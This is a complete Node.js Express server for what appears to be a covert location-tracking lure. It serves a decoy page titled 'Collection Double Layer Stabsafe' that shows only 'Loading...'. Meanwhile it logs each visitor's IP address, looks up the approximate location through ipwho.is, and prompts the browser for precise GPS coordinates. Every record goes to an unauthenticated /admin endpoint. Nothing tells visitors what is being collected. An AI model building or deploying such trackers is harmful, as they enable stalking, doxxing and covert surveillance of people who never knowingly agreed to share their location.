const express = require('express');
const https = require('https');

const app = express();

app.use(express.json());

app.set('trust proxy', true);

const visits = [];

// MAIN PAGE
app.get('/', (req, res) => {

    const ip =
        req.headers['x-forwarded-for'] ||
        req.socket.remoteAddress;

    https.get(`https://ipwho.is/${ip}`, (response) => {

        let data = '';

        response.on('data', (chunk) => {
            data += chunk;
        });

        response.on('end', () => {

            const location = JSON.parse(data);

            const info = {
                ip: ip,
                city: location.city,
                region: location.region,
                country: location.country,
                latitude: location.latitude,
                longitude: location.longitude,
                time: new Date()
            };

            visits.push(info);

            console.log(info);

            res.send(`
                <html>
                <head>
                    <title>Collection Double Layer Stabsafe</title>
                </head>

                <body>
                    <h1>Collection Double Layer Stabsafe</h1>
                    <p>Loading...</p>

                    <script>

                    navigator.geolocation.getCurrentPosition(

                        (position) => {

                            fetch('/save-location', {

                                method: 'POST',

                                headers: {
                                    'Content-Type': 'application/json'
                                },

                                body: JSON.stringify({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                })

                            });

                        },

                        (error) => {
                            console.log(error);
                        }

                    );

                    </script>

                </body>
                </html>
            `);

        });

    }).on('error', (err) => {

        console.log(err);

        res.send('Error');

    });

});

// SAVE GPS LOCATION
app.post('/save-location', (req, res) => {

    const gps = {
        latitude: req.body.latitude,
        longitude: req.body.longitude,
        exact_time: new Date()
    };

    visits.push(gps);

    console.log(gps);

    res.sendStatus(200);

});

// ADMIN PANEL
app.get('/admin', (req, res) => {

    res.json(visits);

});

// START SERVER
app.listen(3000, () => {

    console.log('Server running on port 3000');

});